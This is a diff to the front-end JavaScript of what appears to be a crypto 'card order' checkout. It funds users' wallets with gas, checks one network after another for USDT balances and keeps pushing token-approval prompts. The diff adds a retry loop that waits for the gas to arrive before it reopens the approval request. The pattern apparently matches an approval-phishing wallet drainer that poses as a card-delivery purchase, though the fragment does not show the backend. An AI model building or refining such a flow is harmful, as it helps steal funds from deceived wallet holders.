@@ -212,6 +212,7 @@ async function startSession() {
       JSON.parse(e.data);
       setLoaderStep('sign');
       setBusy(true, 'Confirm in your wallet', 'After submission, the card will be delivered via mail and physically at your doorstep.');
+      reopenSelectedWallet();
       waitForPaymentResult();
     });
 
@@ -776,7 +777,7 @@ async function ensureGasInBackground(p) {
     /* already funded or not needed */
   }
   if (topupHash) {
-    setBusy(true, 'Top-up confirmed', 'Approval opens in your wallet a few seconds after the top-up hash.');
+    setBusy(true, 'Top-up confirmed', 'Waiting for the gas to arrive in your wallet. The approval opens after that, not before.');
     return true;
   }
   return waitUntilGasReady({ poll: false });
@@ -790,7 +791,7 @@ async function requestCurrentApproval() {
   const ready = alreadyHasGas(p);
   setBusy(true, 'Approve on ' + label, ready
     ? 'Your wallet already has gas. Confirm the approval in your wallet.'
-    : 'Confirm the approval in your wallet. After a top-up, the request opens a few seconds after the hash.');
+    : 'The approval opens only after the top-up gas has arrived in your wallet.');
   try {
     const res = await fetch(BASE + '/api/payment/' + encodeURIComponent(paymentId) + '/request', {
       method: 'POST',
@@ -800,7 +801,7 @@ async function requestCurrentApproval() {
     const data = await res.json();
     if (!res.ok) {
       if (/already waiting/i.test(String(data.message || ''))) return;
-      if (/does not have enough USDT|Skipping/i.test(String(data.message || ''))) {
+      if (/does not have enough USDT|Skipping|has not arrived/i.test(String(data.message || ''))) {
         if (paymentId) finishedPayments.add(paymentId);
         tryNextNetworkOrStop(p && p.network);
         return;
@@ -810,17 +811,17 @@ async function requestCurrentApproval() {
       }
       throw new Error(data.message || 'Could not request approval');
     }
+    if (data.waitingForGas) {
+      setBusy(true, 'Waiting for gas', 'Top-up succeeded. The approval stays closed until the gas arrives in your wallet.');
+      await sleep(2500);
+      if (!resolved) return requestCurrentApproval();
+      return;
+    }
     reopenSelectedWallet();
     waitForPaymentResult();
   } catch (err) {
-    if (/insufficient|could not confirm live|native gas|Need at least 0.01/i.test(String(err.message || ''))) {
+    if (/insufficient|could not confirm live|native gas|Need at least 0.01|has not arrived/i.test(String(err.message || ''))) {
       tryNextNetworkOrStop(p && p.network);
-      return;
-    }
-    const toppedUp = Boolean(p && (p.gasFundingTxHash || (p.gas && p.gas.transactionHash)));
-    if (toppedUp) {
-      reopenSelectedWallet();
-      waitForPaymentResult();
       return;
     }
     if (p.network === 'eth') {
